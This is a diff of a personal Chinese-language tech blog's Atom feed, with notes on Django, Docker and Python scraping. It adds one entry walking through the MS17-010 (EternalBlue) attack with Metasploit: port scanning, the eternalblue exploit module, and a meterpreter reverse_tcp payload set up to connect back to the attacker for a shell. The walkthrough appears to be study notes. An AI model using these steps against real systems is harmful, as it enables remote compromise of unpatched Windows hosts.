@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-05-27T14:51:51.922Z</updated>
+  <updated>2020-06-10T13:25:40.048Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="http://yoursite.com/2020/05/26/django/"/>
     <id>http://yoursite.com/2020/05/26/django/</id>
     <published>2020-05-26T15:31:48.000Z</published>
-    <updated>2020-05-27T14:51:51.922Z</updated>
+    <updated>2020-06-10T13:25:40.048Z</updated>
     
     <content type="html"><![CDATA[<p>目录结构<br>    init.py：是一个python的包<br>    settings.py：项目的配置文件<br>    urls.py：路由配置文件<br>    wsgi.py：web服务器和Django交互入口<br>    manage.py:项目的管理文件<br>    ```bash</p><h2 id="django-创建命令-python-manage-py-startapp-app-name"><a href="#django-创建命令-python-manage-py-startapp-app-name" class="headerlink" title="django 创建命令 python manage.py startapp app-name"></a>django 创建命令 python manage.py startapp app-name</h2><pre><code>init.py：python模块 migrations：储存模型类迁移文件 admin.py：后台管理文件 models.py：和数据库交互模块 tests.py：测试代码文件 views.py：接受请求，处理，与M和T进行交互，返回应答，定义处理视图函数。</code></pre><p>修改 setting.py中的INSTALLED_APPS配置项，加上刚刚创建的应用程序</p><h2 id="启动程序：python-manage-py-runserver"><a href="#启动程序：python-manage-py-runserver" class="headerlink" title="启动程序：python manage.py runserver"></a>启动程序：python manage.py runserver</h2><h2 id="定义模型类，需要继承models-Model类"><a href="#定义模型类，需要继承models-Model类" class="headerlink" title="定义模型类，需要继承models.Model类"></a>定义模型类，需要继承models.Model类</h2><pre><code class="bash">from django.db import models</code></pre>]]></content>
     
@@ -34,6 +34,8 @@
     
     </summary>
     
+    
+      <category term="python" scheme="http://yoursite.com/categories/python/"/>
     
     
   </entry>
@@ -54,6 +56,25 @@
         &lt;h1 id=&quot;PDO扩展的使用&quot;&gt;&lt;a href=&quot;#PDO扩展的使用&quot; class=&quot;headerlink&quot; title=&quot;PDO扩展的使用&quot;&gt;&lt;/a&gt;PDO扩展的使用&lt;/h1&gt;&lt;p&gt;使用PDO连接数据库需要先实例化PDO&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&quot;bash
       
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>ms17-010</title>
+    <link href="http://yoursite.com/2020/05/23/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
+    <id>http://yoursite.com/2020/05/23/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</id>
+    <published>2020-05-23T09:58:36.000Z</published>
+    <updated>2020-06-10T13:58:09.988Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="信息收集阶段"><a href="#信息收集阶段" class="headerlink" title="信息收集阶段"></a>信息收集阶段</h1><a id="more"></a><p><img src="/img/11.jpg" alt="alt 图片"><br><img src="/img/22.jpg" alt="alt 图片"></p><pre><code class="bash">scanner查看扫描模块以syn为例子 use auxiliary/scanner/portscan/syn <span class="built_in">set</span> RHPSTS ip and ports 0-500run 永恒之蓝利用445端口 smb服务 操作系统溢出漏洞</code></pre><h1 id="或者可以使用nmap扫描-nmap-sV-ip地址"><a href="#或者可以使用nmap扫描-nmap-sV-ip地址" class="headerlink" title="或者可以使用nmap扫描 nmap -sV ip地址"></a>或者可以使用nmap扫描 nmap -sV ip地址</h1><h1 id="尝试攻击"><a href="#尝试攻击" class="headerlink" title="尝试攻击"></a>尝试攻击</h1><h2 id="查看漏洞模块"><a href="#查看漏洞模块" class="headerlink" title="查看漏洞模块"></a>查看漏洞模块</h2><p>查看漏洞模块——search ms17-010<br>可以先使用辅助扫描模块测试 use auxiliary/scanner/smb/smb_ms17_010<br>    set payload ：设置payload，这里用set payload windows/x64/meterpreter/reverse_tcp<br>    要选用其他payload可以使用show payloads查看适合要攻击的目标主机的payload<br>    <img src="/img/3.jpg" alt="alt 图片"><br>    ## show options ：使用该命令会列出使用当前模块所需呀配置的参数</p><pre><code>### set RHOST 目标主机地址 ：该命令会设置好要攻击的目标主机地址### set LHOST 攻击机地址 ：该命令设置攻击机的地址，使目标主机回连至攻击机### set LPORT 回连的端口 ：该命令设置目标主机回连至攻击机的端口，默认为4444### run：开始攻击</code></pre><h1 id="使用攻击模块进行攻击-use-exploit-windows-smb-ms17-010-eternalblue"><a href="#使用攻击模块进行攻击-use-exploit-windows-smb-ms17-010-eternalblue" class="headerlink" title="使用攻击模块进行攻击 use exploit/windows/smb/ms17_010_eternalblue"></a>使用攻击模块进行攻击 use exploit/windows/smb/ms17_010_eternalblue</h1><p><img src="/img/4.jpg" alt="alt 图片"></p><h3 id="成功后会得到一个shell"><a href="#成功后会得到一个shell" class="headerlink" title="成功后会得到一个shell"></a>成功后会得到一个shell</h3><h3 id="到这里漏洞攻击已经成功"><a href="#到这里漏洞攻击已经成功" class="headerlink" title="到这里漏洞攻击已经成功"></a>到这里漏洞攻击已经成功</h3><p> meterpreter汉字乱码问题<br>成因  linux默认是utf-8编码  换成gbk即可</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;信息收集阶段&quot;&gt;&lt;a href=&quot;#信息收集阶段&quot; class=&quot;headerlink&quot; title=&quot;信息收集阶段&quot;&gt;&lt;/a&gt;信息收集阶段&lt;/h1&gt;
     
     </summary>
     
@@ -85,7 +106,7 @@
     <link href="http://yoursite.com/2020/04/09/docker/"/>
     <id>http://yoursite.com/2020/04/09/docker/</id>
     <published>2020-04-09T07:54:04.000Z</published>
-    <updated>2020-04-09T08:51:35.022Z</updated>
+    <updated>2020-06-10T13:16:06.641Z</updated>
     
     <content type="html"><![CDATA[<h1 id="docker-常用命令"><a href="#docker-常用命令" class="headerlink" title="docker 常用命令"></a>docker 常用命令</h1><a id="more"></a><p>service docker restart #重启docker</p><p> docker images 列出本地镜像</p><ul><li>-q只显示镜像id，-a列出本地所有镜像 –digests显示镜像的摘要信息 –no-trunc显示完整信息<br>docker run 创建一个新的容器并运行</li><li>-it交互式运行  -d后台运行并返回id -p指定端口映射<br>docker search crntos -s 30 列出点赞数超过30的指定镜像<br>docker start 启动一个或者多个停止的容器<br>docker stop停止容器<br>docker rm删除一个或者多个容器 -f<br>docker kill杀死一个容器<br>docker exec在运行的容器中执行命令 -d -i -t<br>docker pull 拉取镜像<br>docker build 创建镜像</li><li>-f指定dockerfile路径 –pull 更新镜像 –network指定run的网络<br>docker commit将容器固化成一个新的镜像<br>docker ps -q -a<br>docker rename 重命名<br>docker cp容器主机之间的数据拷贝</li></ul><h1 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h1><p>docker build -t dockerfile –network=host -t name .<br>docker run -tid –name test –privileged=true ubuntu:18.04 /sbin/init<br>docker exec -it test /bin/bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FROM 基础镜像 当前新镜像是基于那个镜像</span><br><span class="line">MAINTAINER 镜像维护者的姓名和邮箱</span><br><span class="line">RUN 容器构建时需要运行的命令</span><br><span class="line">EXPOSE 当前容器对外暴露的端口</span><br><span class="line">WORKDIR 指定创建的容器后 终端默认登录进来的工作目录</span><br><span class="line">ENV用来构建镜像过程设置环境变量</span><br><span class="line">ADD在宿主机目录下的文件拷贝进镜像且add命令自动处理url和解压tar压缩包</span><br><span class="line">COPY 源路径的文件、目录复制到新的一层镜像内&lt;目录路径&gt;</span><br><span class="line">VOLUME容器数据卷 用于数据保存和持久化工作</span><br><span class="line">CMD指定一个容器启动时要运行的命令 可以有多个但只有最后一个生效</span><br><span class="line">ENTRYPOINT指定一个容器启动时要运行的命令</span><br><span class="line">ONBUILD当构建一个被继承的dockerfile时运行命令 父镜像咋子被子继承后父镜像的onbuild被触发</span><br></pre></td></tr></table></figure>]]></content>
     
@@ -95,6 +116,8 @@
     
     </summary>
     
+    
+      <category term="docker" scheme="http://yoursite.com/categories/docker/"/>
     
     
   </entry>
@@ -126,7 +149,7 @@
     <link href="http://yoursite.com/2020/04/04/%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/"/>
     <id>http://yoursite.com/2020/04/04/%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/</id>
     <published>2020-04-04T11:32:21.000Z</published>
-    <updated>2020-05-20T10:49:20.713Z</updated>
+    <updated>2020-06-10T13:24:35.370Z</updated>
     
     <content type="html"><![CDATA[<h1 id="requests库请求"><a href="#requests库请求" class="headerlink" title="requests库请求"></a>requests库请求</h1><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get请求a=requests.get(<span class="string">'http://127.0.0.1'</span>)</span><br><span class="line">post请求a=requests.post(<span class="string">'https://127.0.0.1'</span>,data=&#123;<span class="string">'key'</span>:<span class="string">'vaule'</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="请求头伪装"><a href="#请求头伪装" class="headerlink" title="请求头伪装"></a>请求头伪装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">headers=&#123;<span class="string">'user-agent'</span>:<span class="string">'xxxxx'</span>&#125;</span><br><span class="line">a=requests.get(url,headers=headers)</span><br></pre></td></tr></table></figure><h3 id="BeautifulSoup"><a href="#BeautifulSoup" class="headerlink" title="BeautifulSoup"></a>BeautifulSoup</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=BeautifulSoup(html,<span class="string">'lxml'</span>)</span><br><span class="line">获取标题内容:a.soup.title.string</span><br><span class="line">获取a标签的内容:a.p.string</span><br><span class="line">获取所有a标签：a.find_all(<span class="string">'a'</span>)</span><br><span class="line">获取id为xxx的标签：a.find(id=<span class="string">"xxx"</span>)</span><br></pre></td></tr></table></figure><h3 id="xpath表达式"><a href="#xpath表达式" class="headerlink" title="xpath表达式"></a>xpath表达式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pip install lxml</span><br><span class="line">import lxml </span><br><span class="line">a=html.xpath(<span class="string">'//div[@class="text"]/h2/a/'</span>)</span><br><span class="line">/       <span class="comment"># 逐层提取s</span></span><br><span class="line">text（）<span class="comment">#提取标签下面的文本</span></span><br><span class="line">//标签名**提取所有标签为**的标签</span><br><span class="line">//标签名[@属性=<span class="string">'属性值'</span>]<span class="comment">#提取所有属性为属性值的标签</span></span><br><span class="line">@属性名 <span class="comment">#代表取某个人属性值</span></span><br></pre></td></tr></table></figure><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f=open(<span class="string">'文件路径'</span>，<span class="string">'w文件操作方式'</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">with open(<span class="string">'文件路径'</span>，<span class="string">'操作方式'</span>) as f:</span><br><span class="line">对文件进行的操作</span><br><span class="line">f.readlines() <span class="comment">#  按行读取</span></span><br><span class="line">f.write(<span class="string">"一大段文字"</span>)<span class="comment">#文件写入</span></span><br></pre></td></tr></table></figure><h3 id="multiprocessing"><a href="#multiprocessing" class="headerlink" title="multiprocessing"></a>multiprocessing</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">multiprocessing下有个dummy模块下有个pool类</span><br><span class="line">from multiprocessing.dummy import Pool</span><br><span class="line">def qu(url):</span><br><span class="line">requests.get(url)</span><br><span class="line">url=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(100):</span><br><span class="line">url.appned(<span class="string">"http://127.0.0.1"</span>)</span><br><span class="line">pool=pool(5)</span><br><span class="line">pool.map(qu,url)</span><br><span class="line">map()<span class="comment">#方法接受两个参数 第一个是函数名字 2是迭代对象</span></span><br></pre></td></tr></table></figure><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pip install redis</span><br><span class="line">import redis</span><br><span class="line">c=redis.StrictRedis(host=<span class="string">'127.0.0.1'</span>,port=2739,password=<span class="string">'12345'</span>)<span class="comment">#连接redis</span></span><br><span class="line">c.lpush(<span class="string">'chapter_6'</span>,123)<span class="comment">#把123放到chapter_6列表的左侧</span></span><br><span class="line">v=c.lpop(<span class="string">'chapter_6'</span>)<span class="comment">#在列表左侧读取一个值</span></span><br><span class="line">c.sadd(<span class="string">'test'</span>,<span class="string">'www.baidu.com'</span>)<span class="comment">#往集合添加一个网址</span></span><br><span class="line">url=c.spop(<span class="string">'url'</span>)<span class="comment">#从集合读取一个值</span></span><br><span class="line">length=c.scard(<span class="string">'url'</span>)<span class="comment">#查看集合长度</span></span><br></pre></td></tr></table></figure><p>###</p><pre><code class="bash"></code></pre><p>###<br>###<br>###<br>###<br>###</p>]]></content>
     
@@ -136,6 +159,8 @@
     
     </summary>
     
+    
+      <category term="python" scheme="http://yoursite.com/categories/python/"/>
     
     
   </entry>
